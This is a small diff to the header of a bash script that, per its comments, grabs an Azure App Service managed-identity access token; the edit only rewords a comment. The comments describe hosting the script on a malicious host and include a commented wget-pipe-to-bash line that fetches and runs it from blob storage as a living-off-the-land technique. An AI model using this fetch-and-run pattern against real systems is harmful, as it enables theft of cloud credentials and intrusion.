@@ -1,6 +1,6 @@
 #!/bin/bash
 # Use this script to get access token of Azure App Service's system-assigned managed identity
-# You must have Website Contributor to https://<your_app_name>.scm.azurewebsites.net/webssh/host
+# You must have Website Contributor to access https://<your_app_name>.scm.azurewebsites.net/webssh/host
 # This script can be hosted in a controled malicious host and execute directly from that as living off the land technique
 # wget -qO- https://<storage_account_name>.blob.core.windows.net/scripts/hello.sh | dos2unix | bash (LoTL)
 
